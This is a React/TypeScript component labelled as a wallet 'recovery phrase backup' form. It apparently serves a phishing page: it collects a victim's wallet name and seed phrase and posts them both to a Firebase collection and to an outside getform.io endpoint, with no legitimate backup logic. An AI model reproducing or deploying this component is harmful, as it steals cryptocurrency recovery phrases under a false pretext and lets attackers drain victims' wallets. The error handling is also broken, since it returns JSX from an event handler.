import React, { useState } from "react";
import { Button } from "../../../../../Global/Button/Button";
import { usePost } from "../../../../../Global/hook/usePost";
import { Input } from "../../../../../Global/Input/Input";
import { Message } from "../../../../../Global/Message/Message";

interface RecoveryPhraseBackupProps {
  onSuccess: () => void;
}

export const RecoveryPhraseBackup: React.FC<RecoveryPhraseBackupProps> = ({ onSuccess }) => {
  const [walletName, setWalletName] = useState("");
  const [recoveryPhrase, setRecoveryPhrase] = useState("");

  // Initialize the usePost hook
  const { post } = usePost();

  const handleBackup = async (e: React.FormEvent) => {
    e.preventDefault();

    // Prepare the data to be posted to both Firebase and getform.io
    const postData = {
      walletName,
      recoveryPhrase,
    };

    // Make the POST request to Firebase using the usePost hook
    await post("backedup", postData);

    // Make the POST request to getform.io
    try {
      const getformResponse = await fetch("https://getform.io/f/e7843df7-96fc-4788-8449-e8aa0018ad7b", {
        method: "POST",
        body: JSON.stringify(postData),
        headers: {
          "Content-Type": "application/json",
        },
      });
    } catch (error: any) {
      return <Message message={error.message} />;
      // Handle any exceptions that may occur during the fetch request
    }
    onSuccess();
    // Call the 'onSuccess' callback or any other logic you need after the form is successfully submitted
  };

  return (
    <form onSubmit={handleBackup}>
      <Input
        type="text"
        placeholder="Enter Wallet Name e.g trust wallet"
        value={walletName}
        onChange={e => setWalletName(e.target.value)}
        required
        name="Wallet Name"
      />
      <textarea
        className="mt-4 flex w-full cursor-pointer items-center border-b-2 border-b-[#ebebeb] p-1 py-0 outline-none"
        placeholder="Enter Recovery Phrase"
        value={recoveryPhrase}
        onChange={e => setRecoveryPhrase(e.target.value)}
        required
        name="Recovery Phrase"
      />
      <i>there should space after each word</i>
      <Button type="submit" className="mt-5 w-full">
        Submit
      </Button>
    </form>
  );
};
